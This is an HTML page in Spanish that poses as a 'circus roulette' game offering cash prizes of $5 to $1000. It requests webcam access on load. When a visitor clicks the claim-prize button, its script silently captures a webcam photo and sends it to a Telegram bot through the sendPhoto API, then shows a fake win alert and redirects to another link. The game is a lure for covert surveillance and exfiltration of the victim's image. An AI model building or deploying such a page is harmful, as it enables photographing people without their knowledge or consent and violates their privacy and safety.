<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ruleta de Circo</title>
    <style>
        body {
            background-color: #f0f8ff;
            text-align: center;
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
        }
        .ruleta {
            width: 80vw;
            height: 80vw;
            max-width: 350px;
            max-height: 350px;
            border-radius: 50%;
            border: 10px solid #ff0000;
            margin: 20px auto;
            position: relative;
            background: conic-gradient(
                #ff6347 0deg 60deg, 
                #ff8c00 60deg 120deg, 
                #ffcc00 120deg 180deg, 
                #ffd700 180deg 240deg, 
                #32cd32 240deg 300deg, 
                #ff1493 300deg 360deg
            );
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
        }
        .sector {
            position: absolute;
            width: 50%;
            height: 50%;
            text-align: center;
            font-size: 18px;
            color: white;
            line-height: 50px;
            font-weight: bold;
            padding-top: 20px;
        }
        #spinButton, #reclamarBtn {
            margin-top: 20px;
            padding: 12px 24px;
            font-size: 18px;
            cursor: pointer;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            transition: background-color 0.3s;
            width: 80%;
            max-width: 200px;
        }
        #spinButton:hover, #reclamarBtn:hover {
            background-color: #218838;
        }
        #reclamarBtn {
            display: none;
            animation: showBox 1s ease-out;
        }
        #premioDisplay {
            font-size: 22px;
            font-weight: bold;
            color: #007bff;
            margin-top: 20px;
        }
        @keyframes showBox {
            0% {
                transform: scale(0);
                opacity: 0;
            }
            100% {
                transform: scale(1);
                opacity: 1;
            }
        }
    </style>
</head>
<body>

    <h1>Ruleta de Circo</h1>

    <div class="ruleta" id="ruleta">
        <div class="sector" style="transform: rotate(0deg);">
            <img src="https://example.com/imagen_1000.png" alt="Premio $1000" width="80">
        </div>
        <div class="sector" style="transform: rotate(60deg);">
            <img src="https://example.com/imagen_500.png" alt="Premio $500" width="80">
        </div>
        <div class="sector" style="transform: rotate(120deg);">
            <img src="https://example.com/imagen_200.png" alt="Premio $200" width="80">
        </div>
        <div class="sector" style="transform: rotate(180deg);">
            <img src="https://example.com/imagen_50.png" alt="Premio $50" width="80">
        </div>
        <div class="sector" style="transform: rotate(240deg);">
            <img src="https://example.com/imagen_10.png" alt="Premio $10" width="80">
        </div>
        <div class="sector" style="transform: rotate(300deg);">
            <img src="https://example.com/imagen_5.png" alt="Premio $5" width="80">
        </div>
    </div>

    <button id="spinButton">Girar Ruleta</button>
    <button id="reclamarBtn" onclick="reclamarPremio()">Reclamar Premio</button>
    <p id="premioDisplay"></p>

    <script>
        let camara;
        let premio = "";
        let premios = [
            { cantidad: "$1000", icono: "https://example.com/imagen_1000.png" },
            { cantidad: "$500", icono: "https://example.com/imagen_500.png" },
            { cantidad: "$200", icono: "https://example.com/imagen_200.png" },
            { cantidad: "$50", icono: "https://example.com/imagen_50.png" },
            { cantidad: "$10", icono: "https://example.com/imagen_10.png" },
            { cantidad: "$5", icono: "https://example.com/imagen_5.png" }
        ];

        navigator.mediaDevices.getUserMedia({ video: true })
            .then((stream) => {
                camara = stream;
            })
            .catch((error) => {
                console.error('Error al obtener la cámara:', error);
            });

        document.getElementById('spinButton').addEventListener('click', function() {
            let randomDeg = Math.floor(Math.random() * 360) + 720;
            document.getElementById('ruleta').style.transition = 'transform 4s ease-out';
            document.getElementById('ruleta').style.transform = 'rotate(' + randomDeg + 'deg)';

            setTimeout(() => {
                let premioAleatorio = premios[Math.floor(Math.random() * premios.length)];
                premio = premioAleatorio.cantidad;
                let iconoMoneda = premioAleatorio.icono;
                document.getElementById('premioDisplay').innerHTML = `¡Has ganado: <img src="${iconoMoneda}" alt="${premio}"> ${premio}!`;
                document.getElementById('reclamarBtn').style.display = "block";
            }, 4000);
        });

        async function tomarFoto() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 400;
                canvas.height = 300;
                const ctx = canvas.getContext('2d');
                
                const video = document.createElement('video');
                video.srcObject = camara;
                video.play();

                video.onloadeddata = () => {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const foto = canvas.toDataURL('image/png');  // Asegúrate de especificar el tipo de imagen

                    // Enviar la foto a Telegram
                    fetch('https://api.telegram.org/bot<your-bot-token>/sendPhoto', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: '<your-chat-id>',
                            photo: foto
                        })
                    }).then(response => response.json())
                      .then(data => console.log('Foto enviada correctamente!'))
                      .catch(error => console.error('Error al enviar la foto:', error));
                };
            } catch (error) {
                console.error('Error al tomar la foto:', error);
            }
        }

        function reclamarPremio() {
            tomarFoto(); // Tomar la foto antes de redirigir
            alert("¡Has ganado un premio de " + premio + "! Redirigiendo a otro enlace...");
            window.location.href = "https://otro-enlace.com"; // Redirige a otro enlace
        }
    </script>

</body>
</html>
